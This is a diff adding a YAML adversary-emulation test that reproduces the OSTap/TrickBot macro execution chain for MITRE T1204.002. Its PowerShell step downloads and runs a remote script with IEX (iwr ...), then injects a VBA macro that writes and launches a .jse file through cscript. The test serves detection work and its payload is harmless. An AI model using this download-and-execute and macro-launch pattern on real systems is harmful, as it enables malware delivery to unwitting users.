@@ -1,0 +1,49 @@
+api_version: "2.0"
+name: OSTap Style Macro Execution
+description: |
+    This Test uses a VBA macro to create and execute #{jse_path} with cscript.exe. Upon execution, the .jse file launches wscript.exe.
+    Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
+    This is a known execution chain observed by the OSTap downloader commonly used in TrickBot campaigns.
+    References:
+      https://www.computerweekly.com/news/252470091/TrickBot-Trojan-switches-to-stealthy-Ostap-downloader
+args:
+    - name: jse_path
+      type: string
+      default: C:\Users\Public\art.jse
+    - name: ms_product
+      type: string
+      default: Word
+uuid: 8bebc690-18c7-4549-bc98-210f7019efff
+mitre:
+    tactics:
+        - 'TA0002: Execution'
+    techniques:
+        - 'T1204: User Execution'
+    subtechniques:
+        - 'T1204.002: Malicious File'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: |
+        Microsoft #{ms_product} must be installed
+      inline: |
+        try {
+          New-Object -COMObject "#{ms_product}.Application" | Out-Null
+          $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
+          Stop-Process -Name $process
+          exit 0
+        } catch { {Write-Host "You will need to install Microsoft #{ms_product} manually to meet this requirement"
+        } }
+      executor: powershell
+    - name: ostap-style-macro-execution
+      inline: |
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
+        $macrocode = "   Open `"{{.Args.jse_path}}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe {{.Args.jse_path}}`"`n"
+        Invoke-MalDoc -macroCode $macrocode -officeProduct "{{.Args.ms_product}}"
+      executor: powershell
+      cleanup:
+        inline: |
+            Remove-Item {{.Args.jse_path}} -ErrorAction Ignore
+        executor: powershell
